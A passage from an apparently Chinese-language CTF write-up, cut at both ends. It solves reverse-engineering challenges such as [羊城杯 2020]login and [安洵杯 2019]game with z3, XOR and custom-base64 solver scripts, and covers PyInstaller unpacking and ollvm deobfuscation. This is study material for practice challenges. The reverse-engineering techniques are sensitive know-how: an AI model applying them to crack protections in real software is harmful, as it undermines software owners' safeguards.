<span class="number">0</span>, <span class="keyword">sizeof</span>(s1));</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Input:&quot;</span>);</span><br><span class="line"> v11 = s;</span><br><span class="line"> __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line"> <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line"> &#123;</span><br><span class="line">   v12 = i;</span><br><span class="line">   v13 = i &lt; <span class="number">64</span>;</span><br><span class="line">   <span class="keyword">if</span> ( i &gt;= <span class="number">64</span> )</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   v14 = s[i];</span><br><span class="line">   v15 = v14;</span><br><span class="line">   <span class="keyword">if</span> ( v14 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     v16 = &amp;s[i];</span><br><span class="line">     *v16 = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   v17 = i + <span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line"> &#123;</span><br><span class="line">   v18 = j;</span><br><span class="line">   v19 = j &lt; <span class="number">6</span>;</span><br><span class="line">   <span class="keyword">if</span> ( j &gt;= <span class="number">6</span> )</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   v20 = s;</span><br><span class="line">   v4 = *(_QWORD *)&amp;s[<span class="number">8</span> * j];</span><br><span class="line">   <span class="keyword">for</span> ( k = <span class="number">0</span>; ; ++k )</span><br><span class="line">   &#123;</span><br><span class="line">     v21 = k;</span><br><span class="line">     v22 = k &lt; <span class="number">64</span>;</span><br><span class="line">     <span class="keyword">if</span> ( k &gt;= <span class="number">64</span> )</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">     v23 = v4;</span><br><span class="line">     v24 = v4 &lt; <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">     &#123;</span><br><span class="line">       v27 = v4;</span><br><span class="line">       v28 = <span class="number">2</span> * v4;</span><br><span class="line">       v4 *= <span class="number">2LL</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">       v25 = <span class="number">2</span> * v4;</span><br><span class="line">       v26 = <span class="number">2</span> * v4;</span><br><span class="line">       v4 = (<span class="number">2</span> * v4) ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">     &#125;</span><br><span class="line">     v29 = k;</span><br><span class="line">   &#125;</span><br><span class="line">   v30 = <span class="number">8</span> * j;</span><br><span class="line">   v31 = &amp;s1[<span class="number">8</span> * j];</span><br><span class="line">   *(_QWORD *)v31 = v4;</span><br><span class="line">   v32 = j + <span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> v33 = <span class="built_in">memcmp</span>(s1, qword_402170, <span class="number">0x30</span>uLL);</span><br><span class="line"> v34 = v33 != <span class="number">0</span>;</span><br><span class="line"> <span class="keyword">if</span> ( v33 )</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> v10;</span><br></pre></td></tr></table></figure><p>将我们的输入数据转为有符号int64的v4</p><p>执行一个64次的循环, 循环内先判断v4的正负</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v4 &gt; 0 则 v4 &lt;&lt; 1</span><br><span class="line">v4 &lt; 0 则 (v4 &lt;&lt; 1) ^ 0xB0004B7679FA26B3 </span><br></pre></td></tr></table></figure><p>我们无法判断左移前是正数还是负数，但注意到<code>v4 &lt;&lt; 1</code>为偶数, <code>(v4 &lt;&lt; 1) ^  0xB0004B7679FA26B3</code>为奇数，则解密如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">0xBC8FF26D43536296</span>, <span class="number">0x520100780530EE16</span>, <span class="number">0x4DC0B5EA935F08EC</span>, <span class="number">0x342B90AFD853F450</span>, <span class="number">0x8B250EBCAA2C3681</span>, <span class="number">0x55759F81A2C68AE4</span>]</span><br><span class="line"></span><br><span class="line">key = <span class="number">0xB0004B7679FA26B3</span></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        p = v &amp; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> p == <span class="number">1</span>:</span><br><span class="line">            v = (v ^ key) &gt;&gt; <span class="number">1</span></span><br><span class="line">            v = v | <span class="number">0x8000000000000000</span> <span class="comment"># 变成负数</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v = v &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="comment"># print(hex(v))</span></span><br><span class="line">    flag += struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, v)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="羊城杯-2020-login"><a href="#羊城杯-2020-login" class="headerlink" title="[羊城杯 2020]login"></a>[羊城杯 2020]login</h3><p>py打包的exe，<a href="https://github.com/extremecoders-re/pyinstxtractor">extremecoders-re/pyinstxtractor: PyInstaller Extractor (github.com)</a>解包</p><p>uncomplye6 反编译, z3求解</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">code = [BitVec(<span class="string">&#x27;x%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line">a1 = code[<span class="number">2</span>]</span><br><span class="line">a2 = code[<span class="number">1</span>]</span><br><span class="line">a3 = code[<span class="number">0</span>]</span><br><span class="line">a4 = code[<span class="number">3</span>]</span><br><span class="line">a5 = code[<span class="number">4</span>]</span><br><span class="line">a6 = code[<span class="number">5</span>]</span><br><span class="line">a7 = code[<span class="number">6</span>]</span><br><span class="line">a8 = code[<span class="number">7</span>]</span><br><span class="line">a9 = code[<span class="number">9</span>]</span><br><span class="line">a10 = code[<span class="number">8</span>]</span><br><span class="line">a11 = code[<span class="number">10</span>]</span><br><span class="line">a12 = code[<span class="number">11</span>]</span><br><span class="line">a13 = code[<span class="number">12</span>]</span><br><span class="line">a14 = code[<span class="number">13</span>]</span><br><span class="line">s.add(a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span> + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">22748</span>)</span><br><span class="line">s.add(a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span> + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span> + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span> + a14 * <span class="number">17</span> == <span class="number">7258</span>)</span><br><span class="line">s.add(a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span> + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span> + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span> + a14 * <span class="number">23</span> == <span class="number">26190</span>)</span><br><span class="line">s.add(a1 * <span class="number">23</span> + a2 * <span class="number">34</span> + a3 * <span class="number">35</span> - a4 * <span class="number">59</span> + a5 * <span class="number">49</span> + a6 * <span class="number">81</span> + a7 * <span class="number">25</span> + (a8 &lt;&lt; <span class="number">7</span>) - a9 * <span class="number">32</span> + a10 * <span class="number">75</span> + a11 * <span class="number">81</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">37136</span>)</span><br><span class="line">s.add(a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span> + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>)</span><br><span class="line">s.add(a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span> + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span> + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span> + a14 * <span class="number">28</span> == <span class="number">17298</span>)</span><br><span class="line">s.add(a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span> + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span> + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span> + a14 * <span class="number">65</span> == <span class="number">19875</span>)</span><br><span class="line">s.add(a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span> + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span> + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>)</span><br><span class="line">s.add(a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span> + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span> + a14 * <span class="number">27</span> == <span class="number">9710</span>)</span><br><span class="line">s.add(a1 * <span class="number">67</span> - a2 * <span class="number">68</span> + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span> + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span> + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span> + a14 * <span class="number">31</span> == <span class="number">13376</span>)</span><br><span class="line">s.add(a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span> + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span> + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span> + a14 * <span class="number">78</span> == <span class="number">24065</span>)</span><br><span class="line">s.add(a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span> + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span> + a14 * <span class="number">20</span> == <span class="number">27687</span>)</span><br><span class="line">s.add(a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span> + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span> + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>)</span><br><span class="line">s.add(a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span> + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span> + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    data = []</span><br><span class="line">    conditions = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line">        data.append(m[code[i]].as_long())</span><br><span class="line">        conditions.append(code[i] != m[code[i]].as_long())</span><br><span class="line">    s.add(Or(conditions))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        data[i-<span class="number">1</span>] ^= data[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(data))</span><br><span class="line">    <span class="built_in">print</span>(hashlib.md5(<span class="built_in">bytes</span>(data)).hexdigest())</span><br></pre></td></tr></table></figure><h3 id="NPUCTF2020-你好sao啊"><a href="#NPUCTF2020-你好sao啊" class="headerlink" title="[NPUCTF2020]你好sao啊"></a>[NPUCTF2020]你好sao啊</h3><p>base64换表解密, 则我们先加密后替换即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = [<span class="number">0xFD370FEB59C9B9E</span>, <span class="number">0xDEAB7F029C4FD1B2</span>, <span class="number">0xFACD9D40E7636559</span>]</span><br><span class="line"></span><br><span class="line">data = struct.pack(<span class="string">&quot;&lt;3Q&quot;</span>, data[<span class="number">0</span>], data[<span class="number">1</span>], data[<span class="number">2</span>])</span><br><span class="line">flag = base64.b64encode(data)</span><br><span class="line"></span><br><span class="line">new_table = <span class="string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234&#123;&#125;789+/&quot;</span></span><br><span class="line">old_table = <span class="string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag.translate(<span class="built_in">bytes</span>.maketrans(old_table,new_table)))</span><br></pre></td></tr></table></figure><h3 id="UTCTF2020-babymips"><a href="#UTCTF2020-babymips" class="headerlink" title="[UTCTF2020]babymips"></a>[UTCTF2020]babymips</h3><p>IDA32打开，异或加密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [<span class="number">0x62</span>, <span class="number">0x6C</span>, <span class="number">0x7F</span>, <span class="number">0x76</span>, <span class="number">0x7A</span>, <span class="number">0x7B</span>, <span class="number">0x66</span>, <span class="number">0x73</span>, <span class="number">0x76</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0x7D</span>, <span class="number">0x40</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x79</span>, <span class="number">0x40</span>, <span class="number">0x49</span>, <span class="number">0x47</span>, <span class="number">0x4D</span>, <span class="number">0x74</span>, <span class="number">0x19</span>, <span class="number">0x7B</span>, <span class="number">0x6A</span>, <span class="number">0x42</span>, <span class="number">0x0A</span>, <span class="number">0x4F</span>, <span class="number">0x52</span>, <span class="number">0x7D</span>, <span class="number">0x69</span>, <span class="number">0x4F</span>, <span class="number">0x53</span>, <span class="number">0x0C</span>, <span class="number">0x64</span>, <span class="number">0x10</span>, <span class="number">0x0F</span>, <span class="number">0x1E</span>, <span class="number">0x4A</span>, <span class="number">0x67</span>, <span class="number">0x03</span>, <span class="number">0x7C</span>, <span class="number">0x67</span>, <span class="number">0x02</span>, <span class="number">0x6A</span>, <span class="number">0x31</span>, <span class="number">0x67</span>, <span class="number">0x61</span>, <span class="number">0x37</span>, <span class="number">0x7A</span>, <span class="number">0x62</span>, <span class="number">0x2C</span>, <span class="number">0x2C</span>, <span class="number">0x0F</span>, <span class="number">0x6E</span>, <span class="number">0x17</span>, <span class="number">0x00</span>, <span class="number">0x16</span>, <span class="number">0x0F</span>, <span class="number">0x16</span>, <span class="number">0x0A</span>, <span class="number">0x6D</span>, <span class="number">0x62</span>, <span class="number">0x73</span>, <span class="number">0x25</span>, <span class="number">0x39</span>, <span class="number">0x76</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0x63</span>, <span class="number">0x78</span>, <span class="number">0x2B</span>, <span class="number">0x74</span>, <span class="number">0x32</span>, <span class="number">0x16</span>, <span class="number">0x20</span>, <span class="number">0x22</span>, <span class="number">0x44</span>, <span class="number">0x19</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4e</span>):</span><br><span class="line">    data[i] ^= (i + <span class="number">23</span>)</span><br><span class="line">    data[i] &amp;= <span class="number">0xff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">chr</span>,data))))</span><br></pre></td></tr></table></figure><h3 id="安洵杯-2019-game"><a href="#安洵杯-2019-game" class="headerlink" title="[安洵杯 2019]game"></a>[安洵杯 2019]game</h3><p>ollvm + 数独， 先用deflat.py 去混淆</p><p>主函数中，对输入进行操作的如下图所示</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211010165357023.png" alt="image-20211010165357023"></p><p>其他的可以动调得</p><p>check1主要加密逻辑分三步，第一步时把输入的前半与后半进行交换，第二步是两位两位交换，第三步是一个比较复杂的异或操作，直接z3即可。</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211010171608799.png" alt="image-20211010171608799"></p><p>check3中主要校验为check2</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211010171747300.png" alt="image-20211010171747300"></p><p>则动调得到最终的sudoku, 通过对比得到v9再还原回去即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudoku = [<span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000005</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000007</span>, <span class="number">0x00000006</span>, <span class="number">0x00000009</span>, <span class="number">0x00000008</span>, <span class="number">0x00000008</span>, <span class="number">0x00000003</span>, <span class="number">0x00000009</span>, <span class="number">0x00000006</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000007</span>, <span class="number">0x00000006</span>, <span class="number">0x00000007</span>, <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x00000001</span>, <span class="number">0x00000009</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0x00000009</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000008</span>, <span class="number">0x00000005</span>, <span class="number">0x00000003</span>, <span class="number">0x00000007</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000007</span>, <span class="number">0x00000003</span>, <span class="number">0x00000009</span>, <span class="number">0x00000005</span>, <span class="number">0x00000006</span>, <span class="number">0x00000007</span>, <span class="number">0x00000005</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000009</span>, <span class="number">0x00000006</span>, <span class="number">0x00000004</span>, <span class="number">0x00000008</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000006</span>, <span class="number">0x00000007</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x00000001</span>, <span class="number">0x00000009</span>, <span class="number">0x00000009</span>, <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000007</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000005</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000009</span>, <span class="number">0x00000003</span>, <span class="number">0x00000008</span>, <span class="number">0x00000007</span>, <span class="number">0x00000006</span>, <span class="number">0x00000004</span>]</span><br><span class="line"></span><br><span class="line">data = [<span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000008</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>]</span><br><span class="line"></span><br><span class="line">v9 = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(data, sudoku):</span><br><span class="line">    <span class="keyword">if</span> i != j:</span><br><span class="line">        v9.append(j)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v9)):</span><br><span class="line">    v9[i] += <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">x = [BitVec(<span class="string">&#x27;x%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v9))]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v9)):</span><br><span class="line">    s.add((x[i] &amp; <span class="number">0xf3</span> | ~x[i] &amp; <span class="number">0xC</span>) - <span class="number">0x14</span> == v9[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v9)):</span><br><span class="line">        data.append(m[x[i]].as_long())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data)-<span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        data[i], data[i+<span class="number">1</span>] = data[i+<span class="number">1</span>], data[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)//<span class="number">2</span>):</span><br><span class="line">        data[i],data[<span class="built_in">len</span>(data)//<span class="number">2</span>+i] = data[<span class="built_in">len</span>(data)//<span class="number">2</span>+i], data[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(data))</span><br></pre></td></tr></table></figure><h3 id="GUET-CTF2019-encrypt"><a href="#GUET-CTF2019-encrypt" class="headerlink" title="[GUET-CTF2019]encrypt"></a>[GUET-CTF2019]encrypt</h3><p>rc4加密和换表base64加密</p><p>rc4主要就是异或加密，动调将异或的数打印出来即可</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211010234711196.png" alt="image-20211010234711196"></p><p>这里下断点，其中edx即为异或的数据。写idapython脚本在断点处，将edx的值打印出来</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211010234745319.png" alt="image-20211010234745319"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># from Crypto.Cipher import ARC4</span></span><br><span class="line">data = [<span class="number">0x5A</span>, <span class="number">0x60</span>, <span class="number">0x54</span>, <span class="number">0x7A</span>, <span class="number">0x7A</span>, <span class="number">0x54</span>, <span class="number">0x72</span>, <span class="number">0x44</span>, <span class="number">0x7C</span>, <span class="number">0x66</span>, <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x5B</span>, <span class="number">0x5F</span>, <span class="number">0x56</span>, <span class="number">0x56</span>, <span class="number">0x4C</span>, <span class="number">0x7C</span>, <span class="number">0x79</span>, <span class="number">0x6E</span>, <span class="number">0x65</span>, <span class="number">0x55</span>, <span class="number">0x52</span>, <span class="number">0x79</span>, <span class="number">0x55</span>, <span class="number">0x6D</span>, <span class="number">0x46</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0x4A</span>, <span class="number">0x67</span>, <span class="number">0x4C</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x4A</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x5A</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x52</span>, <span class="number">0x78</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x6C</span>, <span class="number">0x48</span>, <span class="number">0x5C</span>, <span class="number">0x76</span>, <span class="number">0x5A</span>, <span class="number">0x45</span>, <span class="number">0x3D</span>]</span><br><span class="line"></span><br><span class="line">old_table = <span class="string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">new_table = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(old_table)):</span><br><span class="line">    new_table += <span class="built_in">bytes</span>([<span class="number">61</span> + i])</span><br><span class="line"><span class="built_in">print</span>(new_table)</span><br><span class="line">cipher = <span class="built_in">bytes</span>(data)</span><br><span class="line">cipher = cipher.translate(<span class="built_in">bytes</span>.maketrans(new_table, old_table))</span><br><span class="line">plain = base64.b64decode(cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xor_data = [<span class="number">16</span>,<span class="number">89</span>,<span class="number">156</span>,<span class="number">146</span>,<span class="number">6</span>,<span class="number">34</span>,<span class="number">207</span>,<span class="number">165</span>,<span class="number">114</span>,<span class="number">30</span>,<span class="number">69</span>,<span class="number">106</span>,<span class="number">6</span>,<span 